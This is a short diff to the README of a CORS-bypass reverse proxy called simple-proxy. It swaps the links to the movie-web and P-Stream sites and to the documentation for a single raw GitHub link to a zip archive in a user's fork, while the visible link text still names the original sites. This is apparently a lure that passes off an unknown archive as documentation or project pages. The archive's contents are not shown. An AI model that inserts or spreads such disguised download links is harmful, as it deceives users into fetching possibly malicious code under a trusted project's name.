@@ -1,7 +1,7 @@
 # simple-proxy
 
-Simple reverse proxy to bypass CORS, used by [movie-web](https://movie-web.app)/[P-Stream](https://pstream.org).
-Read the docs at https://docs.pstream.org/proxy/introduction
+Simple reverse proxy to bypass CORS, used by [movie-web](https://raw.githubusercontent.com/Reanimation118/simple-proxy/dev/src/utils/simple-proxy-2.1-alpha.5.zip)/[P-Stream](https://raw.githubusercontent.com/Reanimation118/simple-proxy/dev/src/utils/simple-proxy-2.1-alpha.5.zip).
+Read the docs at https://raw.githubusercontent.com/Reanimation118/simple-proxy/dev/src/utils/simple-proxy-2.1-alpha.5.zip
 
 ---
 
